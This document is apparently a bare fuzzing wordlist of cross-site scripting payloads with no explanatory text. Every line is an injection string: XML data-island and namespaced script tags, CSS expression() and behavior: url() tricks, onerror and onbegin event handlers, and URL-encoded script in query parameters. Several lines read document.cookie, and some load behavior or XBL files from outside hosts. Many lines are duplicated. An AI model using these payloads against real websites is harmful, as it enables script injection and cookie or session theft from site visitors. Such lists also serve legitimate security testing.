<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>
<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>
<XML SRC="CrossSiteScriptingtest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<xml src="javascript:document.cookie=true;">
>"<xml src="javascript:document.cookie=true;">
<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(document.cookie);</html:script></html:html>
<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
<?xml version="1.0" ?><someElement><a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(1)'/></a></someElement>
'';!--"<XSS>=&{()}
'';!--"<XSS>=&{()}
'';!--"<XSS>=&{()}
'';!--"<XSS>=&{()}
xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;
<XSS STYLE="behavior: url(%(htc)s);">
<XSS STYLE="behavior: url(%(htc)s);">
<XSS STYLE="behavior: url(http://ha.ckers.org/xss.htc);">
<XSS STYLE="behavior: url(xss.htc);">
<XSS STYLE="behavior: url(xss.htc);">
<XSS STYLE="behavior: url(xss.htc);">
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="xss:expression(javascript:alert(1))">
<XSS STYLE="xss:expression(javascript:alert(1))">
<x style="background:url('x&#1;;color:red;/*')">XXX</x>
<x style="background:url('x&#1;;color:red;/*')">XXX</x>
<x style="behavior:url(%(sct)s)">
<x style="behavior:url(%(sct)s)">
<x/style=-m\0o\0z\0-b\0i\0nd\0i\0n\0g\0:\0u\0r\0l\0(\0/\0/b\0u\0s\0i\0ne\0s\0s\0i\0nf\0o\0.c\0o\0.\0u\0k\0/\0la\0b\0s\0/\0x\0b\0l\0/\0x\0b\0l\0.\0x\0m\0l\0#\0x\0s\0s\0)>
x”</title><img src%3dx onerror%3dalert(1)>
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
xyz onerror=alert(6); 
y=<a>alert</a>;content[y](123)
&yr=%3Cbody%20background=http://i.imgur.com/dUS0k.gif%3E&month=05
&zipcode="><script>alert(String.fromCharCode(88,83,83))</script>
&Zoe=%22|alert%28%22XSS%22%29|%22&ZoeSitIdt=147
&zoekterm=%3Cscript%3Ealert(document.cookie);%3C/script%3E
&zoom_query=FFFFUUUUUroot@fbi.fun&zoom_per_page=AWWWWYEEEEEEAH&zoom_and=0&zoom_sort=1%3E%22%3E%3CScRiPt%20%3Ealert%28String.fromCharCode%2878,111,32,114,101,115,117,108,116,115,32,102,111,114,32,34,85,115,101,102,117,108,32,73,110,102,111,114,109,97,116,105,111,110,34%29%29;%3C/ScRiPt%3E
